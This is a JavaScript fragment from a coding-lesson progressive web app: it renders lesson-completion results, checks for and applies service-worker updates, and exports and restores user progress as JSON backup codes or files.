  const acc = LS.quizzes? Math.round(LS.correct/LS.quizzes*100) : 100;
  const nextI=nextLessonIndex(t);
  const root=document.getElementById('view');
  let h='<div class="card resultcard center">'+
    '<div style="font-size:34px">'+(first?'✓':'↻')+'</div>'+
    '<div class="bignum">+'+(first?l.xp:0)+' XP</div>'+
    '<div class="trname" style="margin:4px 0">'+l.name+' complete</div>';
  if(LS.quizzes) h+='<div class="lxp">Quiz accuracy: '+acc+'%</div>';
  if(!first) h+='<div class="lxp">(replay — no new XP)</div>';
  h+='</div>';
  if(nextI>=0){
    h+='<button class="btn" data-act="lesson" data-track="'+t.id+'" data-i="'+nextI+'">Next lesson ›</button>';
  } else {
    h+='<div class="card center"><b>Track complete.</b> You have finished every lesson in '+t.name+'.</div>';
  }
  h+='<button class="btn ghost" data-act="track" data-id="'+t.id+'">Back to '+t.name+'</button>';
  root.innerHTML=h;
  bindView(root);
  window.scrollTo(0,0);
  if(nextI<0) checkBadges();
}

/* =========================================================
   PWA UPDATES — detect a new service worker, prompt to apply
   ========================================================= */
let swReg=null;
function showUpdateBanner(){
  const b=document.getElementById('updatebar');
  if(b) b.classList.add('show');
}
function applyUpdate(){
  if(swReg && swReg.waiting){
    swReg.waiting.postMessage({type:'SKIP_WAITING'}); // activates -> controllerchange -> reload
  } else {
    location.reload();
  }
}
function checkForUpdates(){
  const s=document.getElementById('upstatus');
  if(!('serviceWorker' in navigator) || !swReg){
    if(s) s.textContent='Updates apply once the app is installed to your home screen and reopened.';
    return;
  }
  if(s) s.textContent='Checking for updates…';
  swReg.update().then(()=>{
    setTimeout(()=>{
      if(swReg.waiting){
        if(s) s.innerHTML='<b style="color:var(--amber)">Update ready — tap the bar at the top to install.</b>';
        showUpdateBanner();
      } else if(s){
        s.textContent='You’re on the latest version ('+APP_VERSION+').';
      }
    },900);
  }).catch(()=>{ if(s) s.textContent='Couldn’t check right now (offline?).'; });
}

/* =========================================================
   BACKUP & RESTORE — export/import all progress as a code or file
   ========================================================= */
function openBackup(mode){
  const ta=document.getElementById('backupText');
  const st=document.getElementById('backupStatus');
  st.textContent='';
  if(mode==='export'){
    const payload={app:'codeLearn', v:1, exportedAt:new Date().toISOString(), data:S};
    ta.value=JSON.stringify(payload);
    ta.readOnly=true;
    document.getElementById('backupTitle').textContent='Export backup';
    document.getElementById('backupDesc').textContent='Copy this code (or download it as a file) and keep it somewhere safe. On another device, open Import and paste it in to restore everything.';
    document.getElementById('backupRestore').hidden=true;
    document.getElementById('backupCopy').hidden=false;
    document.getElementById('backupDownload').hidden=false;
    document.getElementById('backupFileBtn').hidden=true;
  } else {
    ta.value=''; ta.readOnly=false;
    ta.placeholder='Paste your backup code here…';
    document.getElementById('backupTitle').textContent='Import / restore';
    document.getElementById('backupDesc').textContent='Paste a backup code below, or load a backup file, then tap Restore. This replaces the progress currently on this device.';
    document.getElementById('backupRestore').hidden=false;
    document.getElementById('backupCopy').hidden=true;
    document.getElementById('backupDownload').hidden=true;
    document.getElementById('backupFileBtn').hidden=false;
  }
  document.getElementById('backupModal').hidden=false;
}
function closeBackup(){ document.getElementById('backupModal').hidden=true; }
function copyBackup(){
  const ta=document.getElementById('backupText');
  const st=document.getElementById('backupStatus');
  const ok=()=>{ st.textContent='Copied to clipboard.'; };
  const manual=()=>{ st.textContent='Could not auto-copy — select the text and copy it.'; };
  if(navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(ta.value).then(ok).catch(()=>{ ta.select(); try{document.execCommand('copy');ok();}catch(e){manual();} });
  } else {
    ta.select(); try{document.execCommand('copy');ok();}catch(e){manual();}
  }
}
function downloadBackup(){
  const ta=document.getElementById('backupText');
  const st=document.getElementById('backupStatus');
  try{
    const blob=new Blob([ta.value],{type:'application/json'});
    const url=URL.createObjectURL(blob);
    const a=document.createElement('a');
    a.href=url; a.download='codelearn-backup-'+today()+'.json';
    document.body.appendChild(a); a.click();
    setTimeout(()=>{ URL.revokeObjectURL(url); a.remove(); },1000);
    st.textContent='If nothing downloaded, use “Copy code” instead and save the text.';
  }catch(e){ st.textContent='Download is not available here — use “Copy code” instead.'; }
}
function handleBackupFile(input){
  const f=input.files && input.files[0];
  if(!f) return;
  const r=new FileReader();
  r.onload=()=>{ document.getElementById('backupText').value=String(r.result||''); document.getElementById('backupStatus').textContent='File loaded — tap Restore.'; };
  r.onerror=()=>{ document.getElementById('backupStatus').textContent='Could not read that file.'; };
  r.readAsText(f);
  input.value=''; // allow re-selecting the same file later
}
function restoreBackup(){
  const ta=document.getElementById('backupText');
  const st=document.getElementById('backupStatus');
  let payload;
  try{ payload=JSON.parse((ta.value||'').trim()); }
  catch(e){ st.textContent='That is not a valid backup — check you pasted the whole code.'; return; }
  const data = (payload && payload.app==='codeLearn' && payload.data) ? payload.data
             : (payload && typeof payload.xp==='number' && payload.done) ? payload
             : null;
  if(!data){ st.textContent='This does not look like a codeLearn backup.'; return; }
  if(!confirm('Restore this backup? It replaces the progress currently on this device.')) return;
  S=Object.assign({xp:0,done:{},hunts:{},streak:{last:'',n:0},badges:{},daily:''}, data);
  save(); renderHeader(); checkBadges();
  closeBackup(); go({name:'profile'});
  toast('✓ Progress restored');
}

if('serviceWorker' in navigator){
  let refreshing=false;
  navigator.serviceWorker.addEventListener('controllerchange',()=>{
    if(refreshing) return; refreshing=true; location.reload();
  });
  window.addEventListener('load',()=>{
    navigator.serviceWorker.register('sw.js').then(reg=>{
      swReg=reg;
      if(reg.waiting && navigator.serviceWorker.controller) showUpdateBanner();
      reg.addEventListener('updatefound',()=>{
        const nw=reg.installing;
        if(!nw) return;
        nw.addEventListener('statechange',()=>{
          if(nw.state==='installed' && navigator.serviceWorker.controller) showUpdateBanner();
        });
      });
      // While the app stays open, look for a new release once an hour.
      setInterval(()=>{ reg.update().catch(()=>{}); }, 60*60*1000);
    }).catch(()=>{});
  });
}
